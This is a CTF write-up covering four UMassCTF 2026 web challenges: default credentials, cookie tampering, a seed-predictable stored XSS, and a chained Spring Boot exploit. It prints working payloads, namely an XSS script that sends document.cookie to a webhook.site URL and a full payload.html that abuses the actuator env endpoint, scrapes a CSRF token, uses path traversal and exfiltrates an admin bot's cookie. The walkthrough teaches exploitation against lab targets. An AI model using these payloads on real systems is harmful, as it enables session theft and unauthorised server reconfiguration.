---
title: "UMass CTF 2026 - Web Writeup"
classes: wide
header:
  teaser: /assets/images/ctf_writeups/UMass_CTF/UMassCTF_Logo.jpg
ribbon: blue
description: "Hello everyone, today's writeup will be for UMassCTF 2026 some web challenges."
categories:
  - CTF Writeups
toc: true
---

Hello everyone, today's writeup will be for UMassCTF 2026 some web challenges, so let's start.

## Brick by Brick

![Brick_by_Brick_](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Brick_by_Brick.png)

The first challenge is black-box style, so let's navigate to the link provided directly.

We can see it's a normal page with no functionalities, so I think to check whether the `robots.txt` exists. 

![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Site_Overview.png)

We can see `robots.txt` looks interesting.

![robots.txt](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/robots.txt.png)

![assembly-guide](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/assembly-guide.png)



![q3-report](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/q3-report.png)

`it-onboarding.txt` caught my attention as it tells us some things:

1. `?file=` parameter which indicates to local file inclusion (LFI)
2. `config.php` which may contains sensitive data.

![it-onboarding](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/it-onboarding.png)

We can see `config.php` file is publicly exposed and contains admin dashboard endpoint with database credentials.

![config](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/config.png)

So, let's go to `/dashboard-admin.php` and login with `administrator:administrator`

![Admin_Login](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Admin_Login.png)

And we got the flag.

![Flag](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Flag.png)

> **Flag:** UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}

## BrOWSER BOSS FIGHT

![BrOWSER_BOSS_FIGHT](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/BrOWSER_BOSS_FIGHT.png)

If we go to the challenge website, we can see an input to enter a key and a door we can click.

![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_Overview.png)

When we look at the source code, we observe that whatever the key we type, it will be replaced with `WEAK_NON_KOOPA_KNOCK`. 

![SourceCode](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/SourceCode.png)

So, typing random key and click on the door will redirect us to this page.

![Site_Overview_2](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_Overview_2.png)

If we look at burp suite, we can see interesting `Server` header in response with hint of `under_the_doormate`.

![password](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/password_1.png)



Let's try it as key.

![password_2](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/password_2.png)



We can see that we will redirected to another page but no flag appeared.

We can observe that there is a cookie variable called `hasAxe` and its default value is `false`.

![Site_3](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_3.png)

If we add `hasAxe: true` while visiting this endpoint, we will get the flag.

![Flag](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Flag.png)

> **Flag:** UMASS{br0k3n_1n_2_b0wz3r5_c4st13}

## ORDER66

![ORDER66](/assets/images/ctf_writeups/UMass_CTF/ORDER66/ORDER66.png)

`White-Box` Challenge, so let's check the website first to understand what it does dynamically then move to source code.

![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Site_Overview.png)

![checker](/assets/images/ctf_writeups/UMass_CTF/ORDER66/checker.png)

The app contains 66 box and one of them is vulnerable:

```html
<div class="output" style="min-height: 20px; color: #fff; margin-bottom: 10px;">
{% set content = grid_data[i] %}

{% if i == vuln_index %}
    {{ content | safe }}
{% else %}
    {{ content }}
{% endif %}
</div>
```

> `|safe` don't escape characters, so there is a chance for XSS and steal cookies.

But we need to find the vulnerable box. How??

`app.py`

```python
def get_grid_context(uid, seed):
    random.seed(seed) 
    v_index = random.randint(1, 66)
    data = {i: (db.get(f"{uid}:box_{i}") or "") for i in range(1, 67)}
    return data, v_index

@app.route("/", methods=['GET', 'POST'])
def hello_world():
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
        session['seed'] = random.randint(1000, 9999)

    uid = session['user_id']
    
    current_seed = session.get('seed', random.randint(1000, 9999))
    _, current_vuln_index = get_grid_context(uid, current_seed)

    current_content = db.get(f"{uid}:box_{current_vuln_index}") or ""
    
    is_payload_present = "<script" in current_content.lower() or "alert(" in current_content.lower()

    if request.method == 'POST':
        submitted = [int(k.split('_')[1]) for k in request.form if k.startswith('box_') and request.form[k].strip()]
        
        if len(submitted) > 1:
            return "ERROR: Only ONE box allowed.", 400
        
        for i in range(1, 67):
            content = request.form.get(f'box_{i}')
            if content and i in submitted:
                db.set(f"{uid}:box_{i}", content)
                if i == current_vuln_index and ("<script" in content.lower() or "alert(" in content.lower()):
                    is_payload_present = True
            else:
                db.delete(f"{uid}:box_{i}")

    if not is_payload_present:
        session['seed'] = random.randint(1000, 9999)
    else:
        session['seed'] = current_seed 

    seed = session['seed']
    grid_data, vuln_index = get_grid_context(uid, seed)
    
    return render_template('index.html', vuln_index=vuln_index, grid_data=grid_data, user_id=uid, seed=seed, host=host)
```

Python's `random` is deterministic. sme seed equals same output, every time. The seed is exposed in the page. So we can extract the vulnerable box locally:

![Vulnerable_Box_Num](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Vulnerable_Box_Num.png)

If our payload is in the wrong box, the vulnerable box moves on every submission. If it's in the right box, the seed and therefore the vulnerable box stays fixed permanently. So, we can send the seed URL to admin and get the flag.

**Payload:** `<script>fetch('https://webhook.site/YOUR-ID?c='+document.cookie)</script>`

Now, let's send the seed URL to admin and get the flag.

![admin_report](/assets/images/ctf_writeups/UMass_CTF/ORDER66/admin_report.png)

![Flag](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Flag.png)

> **Flag:** UMASS{m@7_t53_f0rce_b$_w!th_y8u}

## The Block City Times

![The_Block_City_Times](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/The_Block_City_Times.png)

Let's firing up the instance and see the challenge.

We can see it is a blog website with some articles and stories in different categories.

![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Site_Overview.png)

It also contains admin login page:

![Admin_Login](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Admin_Login.png)

And a form to submit your story:

![Submit_Story](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Submit_Story.png)

As the challenge is white-box, let's its analyzing files to get the full idea and attack flow.

**`docker-compose.yml` Analysis:**

```yaml
services:

  app:
    build: .
    ports:
      - "${PORT}:8080"
    environment:
      ADMIN_USERNAME: ${ADMIN_USERNAME:-admin}
      ADMIN_PASSWORD: ${ADMIN_PASSWORD:-changed_on_remote}
      APP_OUTBOUND_EDITORIAL_URL: "http://editorial:9000/submissions"
    networks:
      web: {}
      editorial-net:
        aliases:
          - app.internal
    depends_on:
      - editorial

  editorial:
    build: ./editorial
    environment:
      PORT: 9000
      APP_BASE_URL: "http://app.internal:8080"
      ADMIN_USERNAME: ${ADMIN_USERNAME:-admin}
      ADMIN_PASSWORD: ${ADMIN_PASSWORD:-changed_on_remote}
    networks:
      - editorial-net

  report-runner:
    build: ./developer
    environment:
      PORT: 9001
      BASE_URL: "http://app.internal:8080"
      ADMIN_USERNAME: ${ADMIN_USERNAME:-admin}
      ADMIN_PASSWORD: ${ADMIN_PASSWORD:-changed_on_remote}
      FLAG: "UMASS{changed_on_remote}"
    networks:
      web: {}
      editorial-net:
        aliases:
          - report-runner
    depends_on:
      - app

networks:
  web:
    driver: bridge
  editorial-net:
    driver: bridge
    internal: true

```

- The app contains three services `app`, `editorial` and `report-runner` .

- `app` is on **both** networks:

  - it's the bridge between internet and internal.

  - Built from current directory (`.`)

  - Uses ports 8080


  - This is the ONLY service you can access from your browser


  - Environment variables:


  - ADMIN_USERNAME → default: admin


  - ADMIN_PASSWORD → default: changed_on_remote


  - Communicates with editorial via `http://editorial:9000/submissions`
  - Connected networks:
    - `web` allows external access
    - `editorial-net` allows internal communication

- `editorial` is on **internal only** — you can never reach it from outside.
  - Built from `./editorial`

  - Cannot be accessed externally
  - No ports → cannot be accessed from browser
  - Runs on PORT=9000
  - Call back the app using `http://app.internal:8080`
  - Connected networks: `editorial-net`

- `report-runner` is on **both** networks.

  - Built from `./developer`

  - Acts like an Admin bot

  - Environment variables:

    - BASE_URL talks to app `http://app.internal:8080`

    - ADMIN_USERNAME / ADMIN_PASSWORD

    - FLAG = UMASS{changed_on_remote}

  - Connected networks:

    - `web` external network

    - `editorial-net` internal network

- There are two Docker networks:

  - `web` for public

  - `editorial-net` for internal communication

  - The critical one is `editorial-net` which is marked internal:
    true. This means no traffic can enter or leave it from the internet — only containers on that
    network can talk to each other.

So from analysis, we knew `report-runner` logs into the app as admin and the flag is an `env` variable injected into `report-runner`.

If we deep dive in the code, we can see it is build on java and there is an `application.yml` file, so let's analyze.

**`application.yml` Analysis:**

```yaml
spring:
  application:
    name: config-demo
  thymeleaf:
    cache: false
  servlet:
    multipart:
      max-file-size: 5MB
      max-request-size: 6MB

logging:
  level:
    org.springframework.web.servlet.DispatcherServlet: INFO
    org.springframework.boot.actuate.endpoint.web: TRACE

management:
  endpoints:
    web:
      exposure:
        include: refresh, health, info, env
  endpoint:
    health:
      show-details: always
    env:
      post:
        enabled: true
server:
  port: 8080

app:
  admin:
    username: ${ADMIN_USERNAME:admin}
    password: ${ADMIN_PASSWORD:changed_on_remote}

  upload-dir: uploads
  active-config: prod
  enforce-production: true

  outbound:
    editorial-url: "http://localhost:9000/submissions"
    report-url: "http://report-runner:9001/report"
    allowed-types:
      - text/plain
      - application/pdf

  configs:
    dev:
      greeting: "NOTICE: THE WEBSITE IS CURRENTLY RUNNING IN DEV MODE"
      environment-label: "development"
    prod:
      greeting: "BREAKING: MAN FALLS INTO RIVER IN BLOCK CITY"
      environment-label: "production"

```

- The application is based on Spring Boot.

- `management:` handles Spring Boot Actuator exposed endpoints:

  - `/actuator/health` → app status
  - `/actuator/info` → app info
  - `/actuator/env` → environment variables
  - `/actuator/refresh` → reload config 
  - `health` endpoint:
    - `show-details: always` Shows full system details (DB, disk, etc.)
  - `env` endpoint:
    - `enabled: true` Allows modifying environment variables via HTTP POST

- `app:` 

  - Uses admin credentials same as `docker-compose.yml`
  - Uploaded files will be stored in `uploads` directory
  - `active-config: prod` App is running in production mode

  - `enforce-production: true` Forces production rules
  - `app.outbound` handles internal requests:
    - App sends requests to internal service on port `9000`
    - Uses `report-url` as `http://report-runner:9001/report`
    - Allows `text/plain` (`.txt`), `application/pdf` (`.pdf`)
  - `app.configs` tells us that there are two environment modes: `dev` and `prod` 

Now let's see how the admin deals with reports received from users through `report-api.js`.

**`report-api.js` Analysis:**

```javascript
const puppeteer = require('puppeteer');
const fs        = require('fs');
const path      = require('path');

const BASE_URL        = process.env.BASE_URL        || 'http://localhost:8080';
const ADMIN_USERNAME  = process.env.ADMIN_USERNAME  || 'admin';
const ADMIN_PASSWORD  = process.env.ADMIN_PASSWORD  || 'changed_on_remote';
const REPORT_ENDPOINT = process.env.REPORT_ENDPOINT || '/api/config';
const FLAG            = process.env.FLAG            || 'UMASS{TEST_FLAG}';

(async () => {
  const browser = await puppeteer.launch({
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox'],
  });

  try {
    const page = await browser.newPage();

    await page.goto(`${BASE_URL}/login`, { waitUntil: 'networkidle0' });
    await page.type('#username', ADMIN_USERNAME);
    await page.type('#password', ADMIN_PASSWORD);
    await Promise.all([
      page.waitForNavigation({ waitUntil: 'networkidle0' }),
      page.click('button[type="submit"]'),
    ]);

    if (page.url().includes('/login')) {
      console.error('Login failed.');
      process.exitCode = 1;
      return;
    }

    await page.setCookie({
      name: 'FLAG',
      value: FLAG,
    });

    const targetUrl = `${BASE_URL}${REPORT_ENDPOINT}`;
    const response  = await page.goto(targetUrl, { waitUntil: 'networkidle0' });
    const content   = await page.evaluate(() => document.body?.innerText || '');

    const status = response.status();
    console.log(JSON.stringify({
      endpoint:   targetUrl,
      timestamp:  new Date().toISOString(),
      httpStatus: status,
      isError:    status >= 400,
      content:    content.slice(0, 4000),
    }, null, 2));

  } finally {
    await browser.close();
  }
})();

```

- It login with admin credentials.
- It sets the flag into the admin cookie with variable called `FLAG`.
- It visits target endpoint.
- It extracts the page content and execute its Javascript.

**`trigger-server.js` Analysis:**

```javascript
const express    = require('express');
const { spawn }  = require('child_process');
const path       = require('path');

const PORT = process.env.PORT || 9001;
const app  = express();
app.use(express.json());

app.post('/report', (req, res) => {
  const endpoint = req.body?.endpoint || '/api/config';
  const child    = spawn('node', [path.join(__dirname, 'report-api.js')], {
    env: { ...process.env, REPORT_ENDPOINT: endpoint },
  });

  let stdout = '';
  let stderr = '';
  child.stdout.on('data', d => { stdout += d; });
  child.stderr.on('data', d => { stderr += d; });

  child.on('close', code => {
    let report = null;
    try { report = JSON.parse(stdout.trim()); } catch (_) {}
    res.json({ success: code === 0 && report !== null, report, log: stderr.trim() });
  });
});

app.listen(PORT, () => console.log(`Report trigger server on :${PORT}`));
```

- The server listens on port 9001.
- The app calls it at http://report-runner:9001/report. You cannot reach it directly, only the app can. So you need the app's
  `/admin/report` endpoint to call it on your behalf.

- It takes `endpoint` from request body and the default path is `/api/config`.
- It runs `report-api.js` (we explained above) and passes the environment variables.
- It passes `REPORT_ENDPOINT ` as your endpoint (user-input).

Let's move to Editorial Bot analysis.

 **`server.js` Analysis:**

```javascript
const express   = require('express');
const puppeteer = require('puppeteer');
const path      = require('path');
const fs        = require('fs');

const PORT           = process.env.PORT           || 9000;
const APP_BASE_URL   = process.env.APP_BASE_URL   || 'http://localhost:8080';
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'blockworld';

async function openInBrowser(fileUrl) {
  const browser = await puppeteer.launch({
    headless: 'new',
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-features=HttpsUpgrades',
    ],
  });

  try {
    const page = await browser.newPage();
    await page.goto(`${APP_BASE_URL}/login`, { waitUntil: 'networkidle0' });
    await page.type('#username', ADMIN_USERNAME);
    await page.type('#password', ADMIN_PASSWORD);
    await Promise.all([
      page.waitForNavigation({ waitUntil: 'networkidle0' }),
      page.click('button[type="submit"]'),
    ]);

    const currentUrl = page.url();
    if (currentUrl.includes('/login')) {
      throw new Error('Login failed — still on login page after submit');
    }
    console.log("gothere")
    await page.goto(fileUrl, { waitUntil: 'networkidle0' });

    const text = await page.evaluate(() => document.body.innerHTML || '');

    return { text };
  } finally {
    await browser.close();
  }
}

const app = express();
app.use(express.json());

app.post('/submissions', async (req, res) => {
  const { title, author, description, filename } = req.body;

  if (!filename) {
    return res.status(400).json({ error: 'No filename provided.' });
  }

  res.json({ received: true, filename, title, author });

  const fileUrl = `${APP_BASE_URL}/files/${encodeURIComponent(filename)}`;

  try {
    await openInBrowser(fileUrl);
  } catch (err) {
    console.error('Puppeteer error:', err.message);
  }
});

app.listen(PORT, () => {
  console.log(`Editorial server running on http://localhost:${PORT}`);
});

```

- Login with admin credentials.
- `/submissions` route:
  - The filename field comes from the app's story submission.
  - The app sets it when it saves the uploaded file.
  - The bot then visits `/files/<filename>`.
  - If the file is HTML with JavaScript → that JS runs in the bot's browser. That JS has access to the admin session AND can make authenticated requests to the app.

Now let's see the controllers in `sr/java` folder to examine how website works and its routes.

**`StoryController.java` Analysis:**

``` java
@PostMapping("/submit")
public String submitStory(@RequestParam String title,
                          @RequestParam String author,
                          @RequestParam String description,
                          @RequestParam MultipartFile file,
                          Model model) throws IOException {

    model.addAttribute("ticker", appProps.getActive().getGreeting());

    if (file.isEmpty()) {
        model.addAttribute("error", "No file was attached.");
        return "submit";
    }

    String contentType = file.getContentType();
    if (contentType == null || !outboundProps.getAllowedTypes().contains(contentType)) {
        model.addAttribute("error",
            "File type '" + contentType + "' is not accepted. " +
            "Please submit a plain text or PDF document.");
        return "submit";
    }

    String safe = file.getOriginalFilename().replaceAll("[^a-zA-Z0-9._-]", "_");
    String filename = UUID.randomUUID() + "-" + safe;
    Files.write(uploadDir.resolve(filename), file.getBytes());

    Map<String, String> body = Map.of(
        "title",       title,
        "author",      author,
        "description", description,
        "filename",    filename
    );

    ResponseEntity<String> response = restClient.post()
            .uri(outboundProps.getEditorialUrl())
            .contentType(MediaType.APPLICATION_JSON)
            .body(body)
            .retrieve()
            .toEntity(String.class);

    if (response.getStatusCode().is2xxSuccessful()) {
        model.addAttribute("success", true);
        model.addAttribute("submittedTitle", title);
    } else {
        model.addAttribute("error",
            "The system returned an error. Please try again later.");
    }

    return "submit";
}

@GetMapping("/files/{filename}")
public ResponseEntity<Resource> serveFile(@PathVariable String filename) throws IOException {
    Path filePath = uploadDir.resolve(filename).normalize();

    if (!filePath.startsWith(uploadDir)) {
        return ResponseEntity.badRequest().build();
    }

    Resource resource = new FileSystemResource(filePath);
    if (!resource.exists()) {
        return ResponseEntity.notFound().build();
    }

    String contentType = Files.probeContentType(filePath);
    if (contentType == null) contentType = "application/octet-stream";

    return ResponseEntity.ok()
            .contentType(MediaType.parseMediaType(contentType))
            .body(resource);
}
```

- `/submit` route:
  - It takes four parameters: `title`, `author`, `description`, `file`.
  - It checks if file is empty or not.
  - It checks for file content type and whether it in allowed types or not.
  - It removes dangerous characters.
  - It generates a unique file name and stores it.
  - It sends to `Editorial` service `/submissions`.
  - Editorial service receives filename and admin bot opens: `/files/{filename}`
- `/files/{filename}` route:
  - It adds filename to `/uploads`
  - It checks whether the filePath starts with `/uploads`.
  - It loads file and detects content type.
  - Browser receives file

**`ReportController.java`Analysis:**

```java
@Controller
@RequestMapping("/admin/report")
public class ReportController {

    private final AppProperties      appProps;
    private final OutboundProperties outboundProps;
    private final RestClient         restClient;
    private final ObjectMapper       objectMapper;

    public ReportController(AppProperties appProps, OutboundProperties outboundProps,
                            RestClient.Builder builder, ObjectMapper objectMapper) {
        this.appProps      = appProps;
        this.outboundProps = outboundProps;
        this.restClient    = builder.build();
        this.objectMapper  = objectMapper;
    }


    @GetMapping
    public String reportPage() {
        return "redirect:/admin";
    }

    @PostMapping
    public String reportError(@RequestParam(defaultValue = "/api/config") String endpoint,
                              Model model) {
        if (!appProps.getActiveConfig().equals("dev")) {
            return "redirect:/admin?error=reportdevonly";
        }
        if (!endpoint.startsWith("/api/")) {
            return "redirect:/admin?error=reportbadendpoint";
        }

        model.addAttribute("ticker",         appProps.getActive().getGreeting());
        model.addAttribute("activeConfig",   appProps.getActiveConfig());
        model.addAttribute("reportEndpoint", endpoint);

        try {
            String raw = restClient.post()
                    .uri(outboundProps.getReportUrl())
                    .contentType(MediaType.APPLICATION_JSON)
                    .body(Map.of("endpoint", endpoint))
                    .retrieve()
                    .body(String.class);

            JsonNode root = objectMapper.readTree(raw);
            JsonNode reportNode = root.path("report");
            model.addAttribute("reportSuccess", root.path("success").asBoolean(false));
            model.addAttribute("reportJson",    reportNode.isMissingNode() ? ""
                    : objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(reportNode));
            model.addAttribute("reportLog",     root.path("log").asText(""));

        } catch (Exception e) {
            model.addAttribute("reportSuccess", false);
            model.addAttribute("reportJson",    "");
            model.addAttribute("reportLog",     "Failed to reach diagnostic runner: " + e.getMessage());
        }

        return "admin/report";
    }
}

```

- `/admin/report` route:
  - It works only works in `dev` environment mode.
  - It checks if endpoint start with `/api`.
  - It calls `report-runner` (`/report`) and sends  JSON request with endpoint.

**`TagController.java `Analysis:**

```java
@RestController
@RequestMapping("/api/tags")
public class TagController {

    private final ArticleService articleService;

    public TagController(ArticleService articleService) {
        this.articleService = articleService;
    }

    private Set<String> sanitize(Set<String> tags) {
        return tags.stream()
                .map(HtmlUtils::htmlEscape)
                .collect(Collectors.toSet());
    }

    @GetMapping
    public ResponseEntity<Object> index(@RequestParam(required = false) String name) {
        if (name != null) {
            Set<Article> matches = articleService.findByTag(name);
            return ResponseEntity.ok(matches);
        }
        return ResponseEntity.ok(articleService.allTags());
    }

    @GetMapping("/article/{id}")
    public ResponseEntity<Object> tagsForArticle(@PathVariable String id) {
        return articleService.findById(id)
                .<ResponseEntity<Object>>map(a -> ResponseEntity.ok(sanitize(a.getTags())))
                .orElseGet(() -> ResponseEntity.notFound().build());
    }

    @PutMapping("/article/{id}")
    public ResponseEntity<Object> updateTags(@PathVariable String id,
                                             @RequestBody String[] tags) {
        if (!articleService.setTags(id, tags)) return ResponseEntity.notFound().build();
        return articleService.findById(id)
                .<ResponseEntity<Object>>map(a -> ResponseEntity.ok(sanitize(a.getTags())))
                .orElseGet(() -> ResponseEntity.notFound().build());
    }
}

```

- `/api/tags` route:

  - It gets all tags.

  - It gets tags for specific article.

  - It returns articles that have a specific tag.

    ![Tags_2](file:///C:/Users/abdel/Downloads/UMASS_CTF2026/Writeups/The_Block_City_Times/Tags_2.png?lastModify=1776078263)

    ![Tags_1](file:///C:/Users/abdel/Downloads/UMASS_CTF2026/Writeups/The_Block_City_Times/Tags_1.png?lastModify=1776078263)

  - It updates article tags and returns it sanitized. 

### Attack Flow

![Attack_Flow](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Attack_Flow.png)

From our code analysis we know the app accepts file uploads at POST /submit. The upload filter in StoryController.java only allows `text/plain` and `application/pdf`. But when the server serves files back, it uses `Files.probeContentType()` which reads the file extension.

> The `Files.probeContentType()` method is used to identify the MIME type of a file.

We need one file that serves two purposes: setup (when the editorial bot runs it) and exfiltration (when the report-runner bot runs it). The same file is visited by both bots, so we detect which one we are by checking for the FLAG cookie.

**Branch A:** fires when there is NO FLAG cookie → we are the editorial bot → do all the setup work (actuator, CSRF, trigger report-runner).

**Branch B:** fires when FLAG cookie IS present → we are the report-runner bot → read `document.cookie` and send the flag out.

So, when we upload a file, we need to keep `Content-Type` as `text/plain` as this is what passes the server's filter and on the server, filter sees `text/plain` which is allowed. File saved as `<uuid>-payload.html`.

When served later, `Files.probeContentType()` reads `.html` that returns `text/html`. The bot's browser renders it as HTML and executes our JavaScript.

![Payload_Upload](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Payload_Upload.png)

After receiving the submission, the app sends `POST` request with the filename to `editorial:9000/submissions`. The editorial bot launches a real Chromium browser, logs in as admin, then visits `/files/<uuid>-payload.html`. Our JavaScript executes inside that browser with a full admin session.

The flow:

- App calls `http://editorial:9000/submissions`.
- Editorial `server.js` picks up the filename and builds the file URL.
- Bot navigates to /login, types admin credentials and gets the cookie then visits our file `payload.html` as `text/html` and executes the JavaScript
- Our JS now runs in a real browser with a valid admin session cookie
- Every fetch() call our JS makes will carry that admin JSESSIONID automatically.

We can now call any admin-only endpoint such as `/admin/report`.

Our JavaScript is now running inside the editorial bot's browser with admin privileges. The `/admin/report` endpoint which triggers the `report-runner` bot (blocked in production mode (`prod`)). So, we need to unlock it.

From our config analysis we know the actuator's env POST endpoint has no authentication and can write any config property at runtime.

The `/admin/report` endpoint checks if `active-config` equals `dev` before doing anything. In production it just redirects us away. The normal UI switch (`/admin/switch`) is blocked by `enforce-production:true`. But the actuator bypasses the UI entirely and writes directly into the running app's config memory.

So, we need to send `POST /actuator/env` with body `{ "name": "app.active-config", "value": "dev" }` to change the environment. Then we should reload Spring Boot config using `/actuator/refresh `.

Spring Security requires a valid CSRF token on every POST request. Without it the server returns `403` Forbidden. Since our JS is running in the editorial bot's browser which has an admin session, we can fetch `/admin` and read the token directly from the HTML.

The `/admin/report` endpoint has two conditions: must be in `dev` mode (bypassed) and endpoint must start with `/api/`.

We can bypass `/api` using path traversal (`../`) as it does not resolve the path first. We use `/api/../files/payload.html` which passes the string check but resolves to /files/payload.html when the HTTP server processes it.

Now the app called `http://report-runner:9001/report` with our path-traversal endpoint. The report-runner service now spawns `report-api.js` which logs into the app, sets the FLAG as a browser cookie, and visits the endpoint we specified.

`report-api.js` follows the same login flow as the editorial bot. But before visiting any URL it sets the `FLAG` environment variable as a browser cookie. Then it visits our endpoint. Because our path traversal resolved to `/files/payload.html`, it visits our XSS file but this time with the `FLAG` cookie present.

The hard work was done. Now, we just read `document.cookie`, extract the FLAG value, and send it to our server (webhook).

**`payload.html`**

```html
<!doctype html>
<html>
<head><meta charset="utf-8"></head>
<body>
<script>
(async () => {
  try {
    const WEBHOOK = 'https://webhook.site/38ab55e4-b2ea-4b8c-bf94-18416bf67aea';

    const m = /FLAG=([^;]+)/.exec(document.cookie || '');
    if (m) {
      const flag = decodeURIComponent(m[1]);
      await fetch(WEBHOOK + '?flag=' + encodeURIComponent(flag), { mode: 'no-cors' });
      return;
    }

    await fetch('/actuator/env', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'app.active-config', value: 'dev' })
    });
    await fetch('/actuator/refresh', { method: 'POST' });

    const adminHtml = await fetch('/admin').then(r => r.text());
    const csrfMatch = adminHtml.match(/name="_csrf" value="([^"]+)"/);
    if (!csrfMatch) return;
    const csrf = csrfMatch[1];

    const filename = location.pathname.split('/').pop();
    const endpoint = `/api/../files/${filename}`;

    const body = new URLSearchParams();
    body.set('_csrf', csrf);
    body.set('endpoint', endpoint);

    await fetch('/admin/report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString()
    });

  } catch (e) {
    fetch('https://webhook.site/38ab55e4-b2ea-4b8c-bf94-18416bf67aea?err=' + encodeURIComponent(e.message), { mode: 'no-cors' });
  }
})();
</script>
</body>
</html>
```

![Flag](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Flag.png)

> **Flag:** UMASS{A_mAn_h3s_f@l13N_1N_tH3_r1v3r}